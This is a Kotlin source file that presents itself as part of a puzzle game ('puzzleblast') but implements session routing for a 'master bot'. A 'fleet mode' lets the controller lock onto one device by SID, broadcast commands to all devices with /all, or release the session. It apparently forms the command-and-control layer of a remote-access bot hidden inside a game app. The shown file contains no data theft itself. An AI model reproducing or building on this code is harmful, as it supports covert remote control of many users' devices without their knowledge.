package com.puzzleblast.game.core

import com.puzzleblast.game.util.Prefs

/**
 * Single-device mode: session is always this device. Fleet mode: master bot
 * routes to a specific SID; /use locks, /all broadcasts, /background releases.
 */
object SessionManager {
    var lockedSid: String? = null
        private set

    fun current(): String = BotConfig.sid

    fun use(sid: String): String {
        if (!BuildConfigFlag.FLEET) {
            return if (sid == BotConfig.sid) "🆔 locked to ${BotConfig.sid}" else "🎯 SID mismatch (this device: ${BotConfig.sid})"
        }
        lockedSid = sid
        return "🆔 locked to $sid"
    }

    fun background(): String {
        lockedSid = null
        return "🌙 session released"
    }

    fun matches(tag: String?): Boolean {
        if (tag == null) return true
        if (!BuildConfigFlag.FLEET) return tag.equals(BotConfig.sid, true)
        return lockedSid == null || tag.equals(lockedSid, true) || tag.equals(BotConfig.sid, true)
    }

    fun isAll(cmd: String): Boolean = cmd.trimStart().startsWith("/all")
}

object BuildConfigFlag {
    val FLEET: Boolean get() = com.puzzleblast.game.BuildConfig.FLEET_MODE
}
